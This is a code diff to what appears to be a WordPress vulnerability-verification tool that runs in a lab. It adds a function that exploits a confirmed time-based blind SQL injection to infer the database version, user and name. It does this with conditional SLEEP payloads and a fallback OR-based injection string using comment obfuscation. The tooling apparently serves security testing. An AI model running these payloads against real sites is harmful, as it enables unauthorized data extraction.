@@ -8716,6 +8716,27 @@ def verify_wordpress_sqli(
                 caption_en=(f"Step 5 (KEY): TIME-BASED BLIND SQLi CONFIRMED — {_tbslow_s:.1f}s delay "
                             f"(SLEEP) vs {_tbfast_s:.1f}s (control) in {timing_consistent}/{len(timing_pairs)} pairs."),
                 url=boot.base_url + endpoint)
+            # --- Post-confirmation extraction via conditional SLEEP ---
+            try:
+                def _tb_request_fn(payload_v: str):
+                    import time as _t2
+                    _t2_start = _t2.monotonic()
+                    send(payload_v)
+                    return (_t2.monotonic() - _t2_start, 0)
+                _blind_data = _blind_time_extract(
+                    request_fn=_tb_request_fn,
+                    base_payload=_tbwin,
+                    sleep_val=5.0,
+                    sleep_threshold=3.5,
+                    budget_requests=25,
+                )
+                res.evidence["blind_extraction"] = _blind_data
+                step(f"blind extraction: version≈{_blind_data.get('db_version_prefix')!r}, "
+                     f"user≈{_blind_data.get('db_user_prefix')!r}, "
+                     f"db≈{_blind_data.get('db_name_prefix')!r} "
+                     f"({_blind_data.get('requests_used', 0)} requests)")
+            except Exception:
+                pass
         else:
             _max_single_delay_local = max(_slow_times) if _slow_times else 0.0
             step(f"[técnica time-based blind] FALLO: {timing_consistent}/{len(timing_pairs)} "
@@ -12898,6 +12919,93 @@ def verify_wordpress_deserialization_custom_table(
         return res
     finally:
         _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+# ---------------------------------------------------------------------------
+# Time-based blind SQLi data extraction
+# ---------------------------------------------------------------------------
+
+def _blind_time_extract(
+    request_fn,          # callable(payload_value: str) -> (elapsed_s, status_code)
+    base_payload: str,   # the confirmed SLEEP(5) payload template — replace SLEEPVAL with 5/0
+    sleep_val: float = 5.0,
+    sleep_threshold: float = 3.5,
+    budget_requests: int = 60,
+) -> dict:
+    """Extract DB metadata via conditional SLEEP-based inference after blind SQLi confirmed.
+
+    Uses candidate-string matching (not bit-by-bit) to minimize request count:
+    - MySQL version prefix: test "8.0", "5.7", "5.6", "10.", "10.5", "10.6" in one request each
+    - Current DB user: test "root@", "wordpress@", "mysql@", "admin@" in one request each
+    - Current DB name: test "wordpress", "bitnami_wordpress", "wp_", "db_" prefixes
+
+    Returns dict with extracted fields (None if extraction failed or budget exceeded).
+    """
+    import time as _time
+
+    _used = [0]
+
+    def _timed(payload: str) -> float:
+        if _used[0] >= budget_requests:
+            return -1.0
+        _used[0] += 1
+        try:
+            t0 = _time.monotonic()
+            elapsed, _status = request_fn(payload)
+            return elapsed
+        except Exception:
+            return _time.monotonic() - t0
+
+    def _test_prefix(expr: str, candidate: str) -> bool:
+        # IF(SUBSTRING({expr},1,{len(candidate)})='{candidate}', SLEEP({sleep}), SLEEP(0))
+        n = len(candidate)
+        q = candidate.replace("'", "\\'")
+        tpl = base_payload.replace("SLEEPVAL", str(sleep_val))
+        # We build the conditional payload by replacing the SLEEP(SLEEPVAL) with our IF-SLEEP
+        if f"SLEEP({int(sleep_val)})" in tpl:
+            cond = (f"IF(SUBSTRING({expr},{1},{n})='{q}',"
+                    f"SLEEP({int(sleep_val)}),SLEEP(0))")
+            payload = tpl.replace(f"SLEEP({int(sleep_val)})", cond)
+        else:
+            # fallback: OR-based injection
+            payload = (f"'/**/OR/**/(SELECT/**/IF(SUBSTRING({expr},1,{n})='{q}',"
+                       f"SLEEP({int(sleep_val)}),0))-- ")
+        elapsed = _timed(payload)
+        return elapsed >= sleep_threshold
+
+    result: dict = {
+        "db_version_prefix": None,
+        "db_user_prefix": None,
+        "db_name_prefix": None,
+        "requests_used": 0,
+    }
+
+    # --- DB version ---
+    for candidate in ("8.0", "5.7", "5.6", "5.5", "10.5", "10.6", "10.4", "10."):
+        if _used[0] >= budget_requests:
+            break
+        if _test_prefix("version()", candidate):
+            result["db_version_prefix"] = candidate
+            break
+
+    # --- DB user ---
+    for candidate in ("root@", "wordpress@", "mysql@", "admin@", "bitnami@", "dbuser@"):
+        if _used[0] >= budget_requests:
+            break
+        if _test_prefix("user()", candidate):
+            result["db_user_prefix"] = candidate
+            break
+
+    # --- DB name ---
+    for candidate in ("wordpress", "bitnami_wordpress", "wp_", "db_", "test"):
+        if _used[0] >= budget_requests:
+            break
+        if _test_prefix("database()", candidate):
+            result["db_name_prefix"] = candidate
+            break
+
+    result["requests_used"] = _used[0]
+    return result
 
 
 # ---------------------------------------------------------------------------
